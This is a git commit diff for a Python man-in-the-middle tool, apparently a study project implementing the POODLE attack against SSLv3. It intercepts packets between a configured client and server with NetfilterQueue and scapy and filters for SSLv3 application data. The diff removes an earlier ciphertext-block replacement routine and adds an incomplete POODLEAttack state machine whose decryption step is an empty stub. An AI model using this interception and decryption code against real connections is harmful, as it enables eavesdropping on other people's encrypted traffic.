8054c3dfe9ca5cefc3ac2d6669ffb50f272dae02
GoRuGoo <goru.technology@gmail.com>
2025-01-15 11:14:10 +0900

    feat: application_data等の判定まで

--- mitm/attack/attack.py
+++ mitm/attack/attack.py
@@ -1,90 +1,77 @@
 from netfilterqueue import NetfilterQueue
-import scapy.all as scapy
 from scapy.all import *
-from scapy.layers.tls.all import TLS, TLSClientHello, TLSServerHello
+from scapy.layers.tls.all import TLS
 from scapy.layers.http import *
 from scapy.layers.tls import *
+from socketserver import ThreadingMixIn
 from scapy.all import IP, TCP
-from utils.is_sslv3_packet import is_sslv3_packet
-from utils.extract_ssl_message_type import extract_ssl_message_type
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from utils.modify_and_send_packet import modify_and_send_packet
+from utils.is_sslv3_packet import is_sslv3_packet
 from utils.get_field import get_field
 from scapy.layers.inet import IP, TCP
 
 config = json.load(open('config.json'))
 
-block_size = None
-
-
-request_length_count = {}
-post_request_length = None
-ciphertext_length = 0
-data_padding_size_needed = 0
-
-# パケット毎に変わる情報を保持しておく
-
-
-class Session:
-    def __init__(self, src_port):
-        self.downgrade_needed = False
-        self.src_port = src_port
-        self.ciphertext = None
-        self.last_seq = None
-        self.block = None
-
-
-sessions = {}
+def get_field(layer, field_name):
+    return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))
 
 
 def attack_callback(packet):
-    global sessions
-    global block_size
-    global request_length_count
-    global post_request_length
-    global ciphertext_length
-    global data_padding_size_needed
-
     pkt = IP(packet.get_payload())
 
-    if pkt.src == config['target'] and pkt.dst == config['client'] and pkt.haslayer(TLS):
-        src_port = pkt['TCP'].sport
+    if not TLS in pkt:
+        packet.accept()
+        return
 
-        # src_portをキーに持つ形でリクエストごとの暗号文などの情報を保持しておく
-        session = sessions[src_port] if src_port in sessions else Session(
-            src_port)
+    if not is_sslv3_packet(pkt):
+        packet.accept()
+        return
 
-        if session.ciphertext is not None and bytes(pkt)[-block_size:] == session.ciphertext[-block_size:]:
-            new_bytes = bytes(pkt)[:-block_size] + session.block
-            modify_and_send_packet(packet, IP(new_bytes))
+    # サーバー側からの判定を見るだけなので、clientからのパケットは気にする必要がない
+    if pkt.src == config['client']:
+        packet.accept()
+        return
+    print(get_field(pkt.getlayer(TLS),'type') == "application_data")
 
-        sessions[src_port] = session
 
-        if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
 
-            # 同じ長さのパケットの観測回数が5回より少ない場合は、関係ないパケットの可能性がある
-            request_length_count[len(pkt)] = request_length_count[len(
-                pkt)] + 1 if len(pkt) in request_length_count else 1
-            if request_length_count[len(pkt)] < 5:
-                packet.accept()
-                return
+    victim = POODLEAttack()
 
-            # POSTのリクエスト長が毎回更新されてしまうとバグる
-            if post_request_length is None:
-                post_request_length = len(pkt)
+    print(get_field(pkt.getlayer(TLS),'type') == "application_data")
 
-            if block_size is None:
-                if ciphertext_length > 0:
-                    if len(pkt) > ciphertext_length:
-                        block_size = len(pkt) - ciphertext_length
 
-                        current_len = len(pkt)
-                        while (current_len - block_size) in request_length_count:
-                            current_len -= block_size
-                        data_padding_size_needed = request_length_count[current_len]
-                else:
-                    ciphertext_length = len(pkt)
+
+
+
 
     packet.accept()
+
+
+class POODLEAttack:
+    STATE_PADDING = 1
+    STATE_DECRYPT = 2
+    STATE_DECRYPT_MODIFIED = 3
+    STATE_FINISHED = 100
+
+
+    def __init__(self):
+        self.state = POODLEAttack.STATE_PADDING
+
+    def decryptByte(self,appData):
+        pass
+
+    def checkTLSRecord(self,record):
+        if self.state == POODLEAttack.STATE_DECRYPT_MODIFIED:
+            if record == "handshake":
+                self.state = POODLEAttack.STATE_DECRYPT
+            elif record == "application_data":
+                self.decryptByte(self.changedData)
+                self.state = POODLEAttack.STATE_DECRYPT
+
+
+
+
 
 
 try:
